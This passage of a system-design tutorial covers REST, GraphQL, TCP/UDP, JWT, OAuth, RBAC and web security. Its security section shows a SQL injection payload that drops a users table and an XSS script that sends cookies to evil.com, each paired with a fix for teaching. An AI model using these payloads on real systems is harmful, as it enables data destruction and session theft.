  204 No Content      â†’ Success, but nothing to return (e.g. after DELETE)

4xx â€” Your fault (client error)
  400 Bad Request     â†’ You sent invalid data
  401 Unauthorized    â†’ You're not logged in (no valid token)
  403 Forbidden       â†’ You're logged in, but can't access this
  404 Not Found       â†’ That resource doesn't exist
  429 Too Many Requests â†’ You're being rate limited. Slow down.

5xx â€” Our fault (server error)
  500 Internal Server Error â†’ Something broke on the server
  503 Service Unavailable   â†’ Server is down or overloaded
```

---

### What a good API request and response look like

```
Creating a new order:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
REQUEST:
POST /api/v1/orders
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
Content-Type: application/json

{
  "product_id": 123,
  "quantity": 2,
  "delivery_address": "10 Downing St, London"
}

RESPONSE (201 Created):
{
  "order_id": "ord_abc123",
  "status": "confirmed",
  "estimated_delivery": "2024-12-25",
  "total_amount": 29.98,
  "created_at": "2024-12-01T09:00:00Z"
}
```

---

### Good API design principles

```
âœ… Use nouns for resources, not verbs:
   GET /orders          (good)
   GET /getOrders        (bad â€” "get" is in the URL, it's already a GET request)

âœ… Use nested URLs for relationships:
   GET /users/42/orders      (all orders for user 42)
   GET /orders/7/items       (all items in order 7)

âœ… Always version your API:
   /api/v1/users
   /api/v2/users
   (so you can change v2 without breaking apps still using v1)

âœ… Use consistent JSON structure:
   Success: { "data": {...}, "meta": {...} }
   Error:   { "error": "reason here", "code": 400 }

âœ… Support pagination â€” never return a million records at once:
   GET /posts?page=2&limit=20
   Response includes: { "data": [...], "next_cursor": "abc", "has_more": true }

âœ… Idempotency â€” safe operations should be safe to retry:
   GET /users/42  â†’  same result every time âœ…
   DELETE /orders/99  â†’  first call deletes it, second call: 404, but no duplicate harm âœ…
   POST /payments  â†’  must use an idempotency-key header to prevent double-charges âš ï¸
```

---

### API versioning strategies

```
URL versioning (most common):
  /api/v1/users
  /api/v2/users
  Simple, visible, easy to route

Header versioning:
  GET /api/users
  Accept: application/vnd.myapp.v2+json
  Clean URLs, but less obvious

Query param versioning:
  GET /api/users?version=2
  Easy to test in browser, but messy
```

> Version your API from day one. Changing a public API without versioning breaks every client that uses it.

---

## 22. API Protocols â€” the languages systems use to talk

An API protocol is the agreed-upon set of rules for how two systems exchange messages. Think of it like choosing a spoken language â€” both sides need to use the same one.

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                                                              â”‚
â”‚   REST        â†’ "Give me this resource"                      â”‚
â”‚   GraphQL     â†’ "Give me EXACTLY these fields"              â”‚
â”‚   gRPC        â†’ "Call this function on that machine"        â”‚
â”‚   WebSocket   â†’ "Keep the connection open, let's chat"      â”‚
â”‚   Webhook     â†’ "Call ME when something happens"            â”‚
â”‚                                                              â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

### REST â€” the most common

Standard request/response over HTTP. You ask for a resource, the server responds.

- Simple, universally understood
- Stateless â€” each request stands alone
- Uses HTTP verbs (GET, POST, PUT, DELETE)
- Data in JSON format
- Great for: public APIs, mobile apps, web frontends

---

### GraphQL â€” ask for exactly what you want

The client specifies exactly what data it needs. Server returns only that.

- Solves "over-fetching" (getting too much data) and "under-fetching" (not enough in one call)
- One endpoint: `POST /graphql`
- Great for: complex UIs, mobile apps where bandwidth matters

---

### gRPC â€” speed for internal services

Lets one service call a function on another service as if it were local code. Uses Protocol Buffers (binary format) instead of JSON â€” much faster.

- Very fast (binary, not text)
- Strongly typed â€” both sides know exactly what shape the data is
- Great for: internal microservice communication where speed matters

---

### WebSockets â€” real-time two-way connection

A persistent, live connection between client and server. Either side can send messages at any time.

- Not request/response â€” true real-time
- Great for: chat apps, live notifications, multiplayer games, stock tickers

```mermaid
graph TB
    subgraph REST - Request / Response
        C1["Client"] -->|"GET /posts (request)"| S1["Server"]
        S1 -->|"[list of posts] (response)"| C1
    end

    subgraph WebSocket - Persistent open channel
        C2["Client"] <-->|"Messages flow BOTH ways\nat any time, in real-time"| S2["Server"]
    end

    subgraph gRPC - Remote function call
        C3["Service A"] -->|"getUserById(42)"| S3["Service B"]
        S3 -->|"User{id:42, name:'Alice'}"| C3
    end
```

---

### Webhooks â€” the server calls you

Instead of you repeatedly asking "is it done yet?", the server calls you when something happens.

```
Polling (wasteful):                  Webhook (efficient):

Every 5 seconds, you ask:            Server calls YOU when it's ready:
  "Is my payment done?"              POST https://yourapp.com/webhook
  "Is my payment done?"              { "event": "payment.completed",
  "Is my payment done?"                "order_id": "ord_abc123" }
  "Is my payment done?"
  "Yes, just now!" â† only useful
                    reply in ~20

Like calling someone every 5 min     Like asking them to text you
to ask "are you available?"          when they're free
```

---

### Protocol comparison

| Protocol      | Style                    | Format            | Best for                             |
| ------------- | ------------------------ | ----------------- | ------------------------------------ |
| **REST**      | Request / Response       | JSON              | Public APIs, CRUD apps               |
| **GraphQL**   | Request / Response       | JSON              | Complex queries, mobile bandwidth    |
| **gRPC**      | Request / Response       | Binary (Protobuf) | High-speed internal microservices    |
| **WebSocket** | Persistent bidirectional | Text or Binary    | Chat, live feeds, multiplayer games  |
| **Webhook**   | Server pushes to client  | JSON              | Event notifications (Stripe, GitHub) |

---

## 23. Transport Layer â€” TCP and UDP

Before HTTP, REST, or GraphQL can work, there's a lower layer that actually moves bytes from one machine to another. This is the **Transport Layer**.

The two main protocols here are **TCP** and **UDP**. They are like two very different delivery services.

---

### TCP â€” Transmission Control Protocol

**TCP is the careful, reliable courier.** It makes sure every single piece of your message arrives, in order, with no duplicates.

```
How sending data over TCP works:

STEP 1 â€” The Handshake (before any data is sent):
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   You â†’ Server:  "SYN  â€” Hello, are you there?"             â”‚
â”‚   Server â†’ You:  "SYN-ACK â€” Yes! Can you hear me too?"      â”‚
â”‚   You â†’ Server:  "ACK  â€” Great. Let's start sending data."  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
(This is called the "Three-Way Handshake")

STEP 2 â€” Data travels in numbered packets:
  Your message: "Hello World!"
  Split into:   [Packet 1: "Hell"] [Packet 2: "o Wo"] [Packet 3: "rld!"]

STEP 3 â€” Server acknowledges each packet:
  Server: "Got 1 âœ…"  â†’  "Got 2 âœ…"  â†’  still waiting for 3...

STEP 4 â€” Lost packets get resent:
  Packet 3 never arrives â†’ TCP automatically resends it

STEP 5 â€” Packets reassembled in correct order
  Even if they arrived as 1, 3, 2 â†’ reassembled as 1, 2, 3
```

**TCP guarantees:**

- âœ… All data arrives (no packet loss)
- âœ… Data arrives in the correct order
- âœ… No duplicate data
- âŒ Slower because of all the handshaking and acknowledgements
- âŒ More overhead per message

**Used for:** HTTP/HTTPS, emails, SSH, file downloads, database connections â€” anything where **accuracy matters**.

---

### UDP â€” User Datagram Protocol

**UDP is the careless, super-fast courier â€” fire and forget.**

```
How sending data over UDP works:

No handshake.
No acknowledgement.
No ordering.
No error recovery.

You â†’ "Here's the data." â†’ [blasts packets at maximum speed]

That's it. Done.
```

**UDP characteristics:**

- âœ… Very fast â€” no overhead, no waiting
- âœ… Low latency
- âŒ No delivery guarantee (packets might silently get lost)
- âŒ No ordering guarantee (might arrive out of order)
- âŒ No automatic retransmission

**Used for:** Video calls, online gaming, live streaming, DNS lookups, IoT sensors â€” anywhere **speed matters more than perfection**.

---

### The key difference â€” a concrete analogy

```
TCP is like sending a parcel with tracked, signed-for delivery:
  âœ… You get confirmation it was delivered
  âœ… If it gets lost, they redeliver
  âœ… You know it arrived intact and unopened
  âŒ Slightly slower and more expensive
  Use when: the contents really matter (bank transfer, file download)

UDP is like shoving a flyer through a letterbox:
  âœ… Fast â€” no signing, no waiting
  âŒ No confirmation it was received
  âŒ Can't guarantee it didn't land in the bin
  Use when: speed matters, losing 1 in 100 is acceptable (live video)
```

---

### TCP vs UDP side by side

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚             TCP                  â”‚             UDP                   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Connection-based                 â”‚ Connectionless                    â”‚
â”‚ Three-way handshake required     â”‚ No handshake                      â”‚
â”‚ Guaranteed delivery              â”‚ No delivery guarantee             â”‚
â”‚ Guaranteed order                 â”‚ No order guarantee                â”‚
â”‚ Error checking + recovery        â”‚ Basic error checking, no recovery â”‚
â”‚ Slower                           â”‚ Faster                            â”‚
â”‚ Higher overhead                  â”‚ Minimal overhead                  â”‚
â”‚ HTTP, HTTPS, SSH, email, FTP     â”‚ Video calls, DNS, games, QUIC     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

### When does this matter for system design?

```
Designing a video call app?
  â†’ Dropping 1 frame out of 60 is fine. User barely notices.
  â†’ Waiting for retransmission would cause freezing.
  â†’ Use UDP. Speed > perfect delivery.

Designing a payment system?
  â†’ Missing one byte of a transaction = corruption or data loss.
  â†’ Retry until it's confirmed.
  â†’ Use TCP. Accuracy > speed.

Designing a live multiplayer game?
  â†’ Position updates every 50ms. Missing one is fine.
  â†’ The NEXT update will correct any inaccuracy.
  â†’ Use UDP for position. Use TCP for critical game events (kills, chat).

Designing a DNS resolver?
  â†’ Small request, small response, needs to be FAST.
  â†’ If the UDP response gets lost, client just retries.
  â†’ Use UDP.
```

> **Modern note:** HTTP/3 (the latest version of HTTP) runs over **QUIC**, which is built on UDP but adds its own reliability layer. It gets UDP's speed with some TCP-like guarantees, plus it avoids "head-of-line blocking" where a single lost packet stalls everything else.

---

## 24. RESTful APIs â€” the most popular way to build APIs

### What makes an API "RESTful"?

**REST** stands for **Representational State Transfer** â€” a set of design rules for APIs that use plain HTTP.

The core idea: **everything is a resource** (a noun â€” users, posts, orders, products). Resources live at URLs. You use HTTP verbs to say what you want to do to them.

---

### The resource model

```
Resource            URL
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€          â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
All users     â†’     GET  /users
One user      â†’     GET  /users/42
User's orders â†’     GET  /users/42/orders
One order     â†’     GET  /users/42/orders/7
```

Then verbs say what to do:

```
GET    /users          â†’ list all users
POST   /users          â†’ create a new user
GET    /users/42       â†’ get user 42
PUT    /users/42       â†’ completely replace user 42
PATCH  /users/42       â†’ update only specific fields of user 42
DELETE /users/42       â†’ delete user 42
```

---

### A complete REST API â€” example: a blog platform

```
Articles:
  GET    /articles                â†’ list all articles (paginated)
  POST   /articles                â†’ create new article
  GET    /articles/abc123         â†’ get specific article
  PUT    /articles/abc123         â†’ replace entire article
  PATCH  /articles/abc123         â†’ update just the title/body
  DELETE /articles/abc123         â†’ delete article

Comments on an article:
  GET    /articles/abc123/comments        â†’ get all comments
  POST   /articles/abc123/comments        â†’ add a comment
  DELETE /articles/abc123/comments/7      â†’ delete comment 7

Filtering and sorting:
  GET    /articles?category=tech          â†’ filter by category
  GET    /articles?sort=date&order=desc   â†’ sort by date, newest first
  GET    /articles?page=2&limit=20        â†’ paginate: page 2, 20 per page
```

---

### A full REST request/response example

```
Creating a new article:

REQUEST:
  POST /api/v1/articles
  Authorization: Bearer eyJhbGci...
  Content-Type: application/json

  {
    "title": "How TCP/IP actually works",
    "body": "Before HTTP can do anything...",
    "category": "networking",
    "published": false
  }

RESPONSE (201 Created):
  {
    "id": "art_xyz789",
    "title": "How TCP/IP actually works",
    "body": "Before HTTP can do anything...",
    "category": "networking",
    "published": false,
    "author_id": "usr_42",
    "created_at": "2024-12-25T09:00:00Z"
  }
```

---

### The 6 principles of REST (in plain English)

```
1. Client-Server Separation
   The UI (client) and the data/logic (server) are separate systems.
   The client doesn't care how the server stores data.
   The server doesn't care how the client displays it.

2. Stateless
   The server remembers NOTHING between requests.
   Every request must contain all the information needed to handle it.
   (User identity goes in a JWT or session cookie, not server memory.)
   This is what makes horizontal scaling possible.

3. Cacheable
   Responses should say whether they can be cached.
   GET responses are usually cacheable.
   POST/DELETE are usually not.

4. Uniform Interface
   Consistent, predictable URLs and verbs for all resources.
   (The GET/POST/PUT/PATCH/DELETE model we've been using.)

5. Layered System
   The client doesn't know if it's talking directly to the server,
   or to a load balancer, CDN, or API gateway in between.
   It doesn't need to know. The interface is the same.

6. Code on Demand (optional)
   Server can send executable code (e.g. JavaScript).
   Rarely used in modern REST APIs.
```

---

### Common REST anti-patterns â€” what NOT to do

```
âŒ Verbs in URLs:
   GET /getUser?id=42             â†’   GET /users/42
   POST /createOrder              â†’   POST /orders
   POST /deleteUser?id=42         â†’   DELETE /users/42

âŒ No versioning:
   /api/users  (change this â†’ breaks every client that uses it)
   â†’  /api/v1/users  (version it from day one)

âŒ Inconsistent error format:
   Sometimes: { "message": "not found" }
   Sometimes: { "error": { "code": 404, "msg": "..." } }
   Sometimes: just a 404 with no body
   â†’  Always use the same structure

âŒ Returning sensitive fields:
   { "id": 42, "name": "Alice", "password_hash": "$2b$12$..." }
   â†’  Never, ever include password hashes, internal flags, keys in responses
```

---

## 25. GraphQL â€” fetch exactly what you need

### The problem REST has

Imagine a mobile app showing a user's profile page. It needs:

- The user's name and profile photo
- Their last 3 post titles (not the full content)
- Their follower count

With REST you'd make 3 separate calls:

```
Call 1: GET /users/42
  Returns: name, photo, bio, email, settings, created_at, last_login, ...
  (You needed name + photo â€” you got MUCH more. Over-fetching.)

Call 2: GET /users/42/posts
  Returns: 20 posts, each with full body, tags, comments count, ...
  (You needed 3 titles â€” you got way more. Over-fetching again.)

Call 3: GET /users/42/stats
  (You had to make a whole extra call just for follower count. Under-fetching.)

Problems:
  â†’ 3 network round trips (slow on mobile)
  â†’ Got far more data than needed (wastes bandwidth on mobile)
```

This is the **over-fetching / under-fetching problem**.

---

### What GraphQL does instead

The client asks for exactly what it needs, in a single request:

```graphql
query UserProfile {
  user(id: "42") {
    name
    photo
    followerCount
    recentPosts: posts(limit: 3) {
      title
      createdAt
    }
  }
}
```

Response â€” nothing more, nothing less:

```json
{
  "data": {
    "user": {
      "name": "Alice",
      "photo": "https://cdn.example.com/alice.jpg",
      "followerCount": 1234,
      "recentPosts": [
        { "title": "My first post", "createdAt": "2024-12-01" },
        { "title": "Learning GraphQL", "createdAt": "2024-12-10" },
        { "title": "System design tips", "createdAt": "2024-12-20" }
      ]
    }
  }
}
```

**One network call. Exactly the data you asked for.**

---

### How GraphQL works under the hood

```mermaid
graph LR
    Client["ðŸ“± App"]
    GQL["GraphQL Server\nPOST /graphql\n(single endpoint)"]
    US["ðŸ‘¤ User\nService"]
    PS["ðŸ“ Posts\nService"]
    FS["ðŸ‘¥ Followers\nService"]

    Client -->|"query: name + photo\n+ followerCount + 3 posts"| GQL
    GQL -->|"fetch user"| US
    GQL -->|"fetch last 3 posts"| PS
    GQL -->|"fetch follower count"| FS
    US --> GQL
    PS --> GQL
    FS --> GQL
    GQL -->|"exactly what was requested"| Client
```

The GraphQL server acts as an orchestrator â€” the client just describes the shape of data it wants.

---

### Core GraphQL concepts

```
SCHEMA â€” the menu of everything queryable
  Defines all available types and their fields.
  Both client and server must agree on this.

  type User {
    id: ID!
    name: String!
    email: String!
    posts: [Post!]!
    followerCount: Int!
  }

  type Post {
    id: ID!
    title: String!
    body: String!
    createdAt: String!
  }

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

QUERY â€” reading data (like GET in REST)
  query {
    user(id: "42") { name, email }
  }

MUTATION â€” changing data (like POST/PUT/DELETE in REST)
  mutation {
    createPost(title: "Hello!", body: "World") {
      id
      title
    }
  }

SUBSCRIPTION â€” real-time updates (like WebSocket)
  subscription {
    newMessage(chatId: "room1") {
      text
      sender { name }
    }
  }
```

---

### GraphQL vs REST â€” when to use which

```
Use GraphQL when:                    Use REST when:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€        â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
âœ… Mobile app (bandwidth matters)    âœ… Simple CRUD API
âœ… Complex UI needs many data types  âœ… Public API (REST is easier to document)
âœ… Frontend teams iterate fast       âœ… Simple caching (REST URLs cache easily)
âœ… Multiple clients need different   âœ… File uploads or streaming
   views of the same data            âœ… Small project / small team

Real-world GraphQL users:            Real-world REST users:
GitHub API, Shopify, Twitter,        Stripe, Google Maps, Twilio,
Facebook (invented it), Airbnb       most public APIs
```

---

## 26. Authentication â€” proving who you are

### What is authentication?

**Authentication** answers the question: _"Who are you? And can you prove it?"_

When you log into an app, you prove your identity. The app then gives you a "badge" (token or session) that you show on every request, so you don't have to log in on every single click.

```
Without authentication:        With authentication:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€      â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Anyone accesses anything.      You prove who you are once.
No concept of "your data".     Get a badge.
                               Show the badge on every request.
                               Access only your own data.
```

---

### The three authentication factors

```
Factor 1 â€” Something you KNOW:
  Password, PIN, security question answer

Factor 2 â€” Something you HAVE:
  Your phone (receives an SMS code, or runs an authenticator app)
  A physical hardware key (YubiKey)

Factor 3 â€” Something you ARE:
  Fingerprint, Face ID, retina scan

MFA (Multi-Factor Authentication) = combining any 2 of these.
Even if an attacker steals your password, they still can't log in
without your phone or your fingerprint.
```

---

### How session-based auth works (the classic approach)

```mermaid
sequenceDiagram
    participant U as ðŸ‘¤ User
    participant S as ðŸ–¥ï¸ Server
    participant DB as ðŸ—„ï¸ Session Store (Redis)

    U->>S: POST /login { email, password }
    S->>DB: Verify credentials. Create session.
    DB-->>S: Session ID: "sess_abc123"
    S-->>U: Set-Cookie: session_id=sess_abc123

    Note over U,DB: Every subsequent request:
    U->>S: GET /dashboard (Cookie: session_id=sess_abc123)
    S->>DB: Is "sess_abc123" valid? Who is it?
    DB-->>S: Valid. This is Alice (user id: 42).
    S-->>U: Here's Alice's dashboard
```

**The catch:** The session store (Redis) must be shared across ALL your servers. If Server A creates a session, Server B also needs to find it when that user's next request lands there.

---

### How JWT (JSON Web Token) works â€” the modern stateless approach

A JWT is a self-contained token that carries user info inside it. No database lookup needed.

```
A JWT looks like 3 parts separated by dots:

eyJhbGciOiJIUzI1NiJ9  .  eyJ1c2VySWQiOjQyfQ  .  SflKxwRJSMeKKF2QT4â€¦
       â”‚                          â”‚                         â”‚
  Part 1: HEADER             Part 2: PAYLOAD           Part 3: SIGNATURE
  { "alg": "HS256" }    { "userId": 42,            Hash of Part1+Part2
  What algorithm       "email": "a@gmail.com",    using the server's
  was used to sign?    "exp": 1735000000 }        secret key.
                       Who is this?               If anyone tampers
                       When does it expire?       with the payload,
                                                  signature won't match.
                                                  Token rejected.
```

```mermaid
sequenceDiagram
    participant U as ðŸ‘¤ User
    participant S as ðŸ–¥ï¸ Server (any of them)

    U->>S: POST /login { email, password }
    S->>S: Verify credentials. Create signed JWT.
    S-->>U: Here's your JWT token.

    Note over U,S: Every subsequent request:
    U->>S: GET /dashboard  (Authorization: Bearer <jwt>)
    S->>S: Verify signature using secret key âœ…
    S->>S: Check expiry timestamp âœ…
    S-->>U: Here's Alice's dashboard

    Note over S: No database lookup needed!
    Note over S: Any server can verify the token independently.
```

**JWT pros:**

- âœ… Stateless â€” works across multiple servers with no shared session store
- âœ… Carries user info (ID, roles) inside the token itself
- âœ… Perfect for microservices â€” just share the signing secret

**JWT cons:**

- âŒ Can't easily "log out" â€” the token stays valid until it expires (mitigated by short expiry + refresh tokens)
- âŒ If stolen, attacker has full access until expiry
- âŒ Token grows large if you add many claims

---

### OAuth 2.0 â€” "Login with Google / GitHub"

OAuth 2.0 is the protocol behind those "Login with Google" buttons. It lets you grant a third-party app limited access to your account on another service â€” **without giving them your password**.

```
Example: Logging into Spotify with your Facebook account

1. You click "Login with Facebook" on Spotify.

2. Spotify redirects you to Facebook:
   "Spotify wants to read your name and email. Allow?"

3. You log in to Facebook directly. (Spotify never sees your password.)

4. Facebook gives Spotify a limited access token.

5. Spotify uses that token to read your name and email only.

6. You're logged in. Spotify has your identity without ever
   knowing your Facebook password.
```

```mermaid
sequenceDiagram
    participant U as ðŸ‘¤ You
    participant APP as ðŸ“± Spotify (App)
    participant AUTH as ðŸ” Facebook (Auth Server)
    participant RS as ðŸ“‹ Facebook (Resource Server)

    U->>APP: "Login with Facebook"
    APP->>AUTH: Redirect: "User wants to login. My app ID is xyz."
    AUTH->>U: "Spotify wants your name + email. Allow?"
    U->>AUTH: "Allow"
    AUTH->>APP: Authorization Code: "code_abc"
    APP->>AUTH: Exchange code for access token (server-side, secure)
    AUTH->>APP: Access Token: "tok_xyz"
    APP->>RS: GET /me (Authorization: Bearer tok_xyz)
    RS->>APP: { name: "Alice", email: "alice@fb.com" }
    APP->>U: You're logged in as Alice!
```

---

## 27. Authorization â€” what you're allowed to do

### Authentication vs Authorization â€” not the same thing

People confuse these constantly. They are completely different:

```
Authentication = "Who are you?"
  â†’ Verifying identity. Are you who you claim to be?
  â†’ "Show me your ID card."

Authorization = "What are you allowed to do?"
  â†’ Checking permissions. What can this person access?
  â†’ "Your ID is valid, but you don't have clearance for Floor 5."

Example:
  You log into a company app.      â† Authentication âœ…
  You try to view HR salary data.
  You're a developer, not HR.      â† Authorization âŒ â€” Access denied.
```

---

### Role-Based Access Control (RBAC) â€” the most common model

Assign users to **roles**, define what each role can do.

```mermaid
graph LR
    Alice["ðŸ‘¤ Alice"]
    Bob["ðŸ‘¤ Bob"]
    Carol["ðŸ‘¤ Carol"]

    AdminRole["ðŸ›¡ï¸ Admin Role"]
    EditorRole["âœï¸ Editor Role"]
    ViewerRole["ðŸ‘ï¸ Viewer Role"]

    CanDelete["ðŸ—‘ï¸ Delete content"]
    CanWrite["âœï¸ Write content"]
    CanRead["ðŸ“– Read content"]
    ManageUsers["ðŸ‘¥ Manage users"]

    Alice --> AdminRole
    Bob --> EditorRole
    Carol --> ViewerRole

    AdminRole --> CanDelete
    AdminRole --> CanWrite
    AdminRole --> CanRead
    AdminRole --> ManageUsers

    EditorRole --> CanWrite
    EditorRole --> CanRead

    ViewerRole --> CanRead
```

---

### Attribute-Based Access Control (ABAC) â€” finer grained

RBAC gives access based on role. ABAC gives access based on **attributes** â€” much more flexible.

```
ABAC rules use attributes like:

  User attributes:     department, level, location, clearance
  Resource attributes: classification, owner, file type
  Environment:         time of day, IP address, device type

Example rules:
  "Allow access IF user.department = 'Finance'
                AND resource.type = 'salary_report'
                AND time BETWEEN 9am AND 6pm"

  "Allow access IF user.clearance >= resource.required_clearance"

  "Allow access IF user.country = resource.data_residency_region"
  (useful for GDPR compliance)
```

---

### Authorization in practice â€” using JWT claims

When a user logs in and gets a JWT, the token can carry their **roles and permissions**:

```json
{
  "userId": 42,
  "email": "alice@company.com",
  "roles": ["admin", "editor"],
  "permissions": ["articles:write", "articles:delete", "users:manage"],
  "department": "Engineering",
  "exp": 1735000000
}
```

When Alice tries to delete an article:

```
Server receives: DELETE /articles/123
Token says:      roles: ["admin", "editor"]
Server checks:   "Does 'admin' or 'editor' have delete permission?"
Answer:          Admin does â†’ Allow âœ…
```

No database call needed for the authorization check â€” the JWT already carries the answer.

---

### Principle of Least Privilege â€” the golden rule

> **Give every user, service, and process only the permissions they absolutely need to do their job. Nothing more.**

```
Bad practice:
  Every developer has production database admin access.
  â†’ One compromised developer account = full database access = catastrophe.

Good practice:
  Developers have read-only access to logs.
  They request temporary elevated access when needed.
  Access is logged and auto-expires after 1 hour.
  â†’ Compromised account has very limited blast radius.
```

This applies to services too:

- Your image-resizing service should only access the image bucket â€” not the whole S3 account
- Your email service should only be able to send emails â€” not read the database
- Your reporting service should have read-only database access â€” never write access

---

## 28. Security â€” keeping the bad guys out

Security isn't one thing â€” it's a collection of practices across every layer of your system.

---

### HTTPS â€” encrypting everything in transit

Every app should use HTTPS (HTTP with TLS encryption). Without it, anyone on the same network can read your traffic.

```
Without HTTPS (plain HTTP):
  Your browser sends:   POST /login { "password": "hunter2" }
                                      â†“
  Travels over the network unencrypted
                                      â†“
  Anyone on the same WiFi can read:   "password": "hunter2"  âŒ

With HTTPS (TLS encrypted):
  Your browser sends:   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  (looks like garbage)
                                      â†“
  Network sees:         â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  (can't read it)
                                      â†“
  Only the server has the private key to decrypt it  âœ…
```

TLS works by having the server prove its identity (via an SSL certificate), then both sides negotiate a shared encryption key â€” without ever sending that key over the wire.

---

### SQL Injection â€” sneaking commands into your database

```
Your app runs: SELECT * FROM users WHERE email = '[user input]'

Normal user types:    alice@gmail.com
Your query becomes:   SELECT * FROM users WHERE email = 'alice@gmail.com'  âœ…

Attacker types:       ' OR '1'='1
Your query becomes:   SELECT * FROM users WHERE email = '' OR '1'='1'
                                                               ^^^^^^^^^^^
                                                               Always true!
                      â†’ Returns ALL users in the database  âŒ

Attacker types:       '; DROP TABLE users; --
Your query becomes:   ... email = ''; DROP TABLE users; --'
                                       ^^^^^^^^^^^^^^^^^^^
                                       Deletes your entire users table!  âŒ
```

**Fix: Use parameterised queries. Always.**

```python
# DANGEROUS â€” never do this:
query = f"SELECT * FROM users WHERE email = '{user_input}'"

# SAFE â€” always do this:
query = "SELECT * FROM users WHERE email = ?"
cursor.execute(query, [user_input])
# The input is treated as data, never as code.
```

---

### XSS â€” Cross-Site Scripting

An attacker injects malicious JavaScript into your page, which then runs in other users' browsers.

```
Your site shows user comments. Comment stored like:
  <div class="comment">Great article!</div>

Attacker posts this "comment":
  <script>fetch('https://evil.com/?c='+document.cookie)</script>

Your site renders it as actual HTML. When anyone views the page:
  â†’ Their browser runs the attacker's script
  â†’ Their session cookies get sent to evil.com
  â†’ Attacker can now log in as every user who viewed that page  âŒ
```

**Fix:** Always escape/encode user-provided content before rendering it as HTML. Libraries like React, Vue, and Angular do this automatically. Never use `.innerHTML` with untrusted data.

---

### Broken Authentication â€” weak login systems

Common mistakes:

```
âŒ Passwords stored as plain text (or weak hash like MD5)
âŒ No account lockout after many failed attempts
   â†’ Lets attackers try millions of passwords (brute force)
âŒ Session tokens that never expire
âŒ Predictable session IDs (sequential numbers, timestamps)
